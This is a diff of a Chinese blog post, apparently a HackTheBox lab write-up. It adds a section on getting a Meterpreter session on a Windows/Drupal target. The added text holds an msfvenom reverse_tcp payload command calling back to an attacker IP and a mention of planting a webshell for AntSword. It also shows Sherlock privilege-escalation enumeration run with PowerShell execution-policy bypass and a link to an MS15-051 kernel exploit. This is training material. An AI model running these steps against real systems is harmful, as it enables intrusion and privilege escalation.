@@ -40,9 +40,13 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307031352601.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307031353934.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307031354170.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307031632376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307181956174.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307182018619.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307182036797.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307182059121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307182114205.png">
 <meta property="article:published_time" content="2023-07-03T03:17:09.000Z">
-<meta property="article:modified_time" content="2023-07-07T02:57:56.594Z">
+<meta property="article:modified_time" content="2023-07-18T13:14:36.959Z">
 <meta property="article:author" content="Syst1m">
 <meta property="article:tag" content="hackthebox">
 <meta property="article:tag" content="域渗透">
@@ -177,7 +181,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-count">75</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -294,7 +298,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-07-07 10:57:56" itemprop="dateModified" datetime="2023-07-07T10:57:56+08:00">2023-07-07</time>
+      <time title="修改时间：2023-07-18 21:14:36" itemprop="dateModified" datetime="2023-07-18T21:14:36+08:00">2023-07-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -353,8 +357,37 @@
 <p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031353934.png" alt="image-20230703135327900"></p>
 <p>命令执行</p>
 <p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031354170.png" alt="image-20230703135422132"></p>
-<h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>将靶机上线到msf</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031632376.png" alt="image-20230703163237335"></p>
+<h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>为了方便点可以先写个马上线蚁剑(重启后ip变了)</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307181956174.png" alt="image-20230718195638106"></p>
+<p>将靶机上线到msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182018619.png" alt="image-20230718201800576"></p>
+<p>试了几个常用的提权模块,但是提不下来</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182036797.png" alt="image-20230718203628750"></p>
+<p>下载提权脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rasta-mouse/Sherlock.git</span><br></pre></td></tr></table></figure>
+
+<p>加载powershell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br></pre></td></tr></table></figure>
+
+<p>导入powershell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_import <span class="string">&#x27;/root/Desktop/Sherlock/Sherlock.ps1&#x27;</span> <span class="comment"># 本地ps脚本路径</span></span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_execute “find-allvulns”</span><br></pre></td></tr></table></figure>
+
+<p>或则直接上传上去运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;&amp; &#123;Import-Module C:\inetpub\drupal-7.54\Sherlock.ps1;Find-AllVulns&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182059121.png" alt="image-20230718205948075"></p>
+<p>下载exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip</span><br></pre></td></tr></table></figure>
+
+<p>上传运行</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182114205.png" alt="image-20230718211429146"></p>
 
     </div>
 
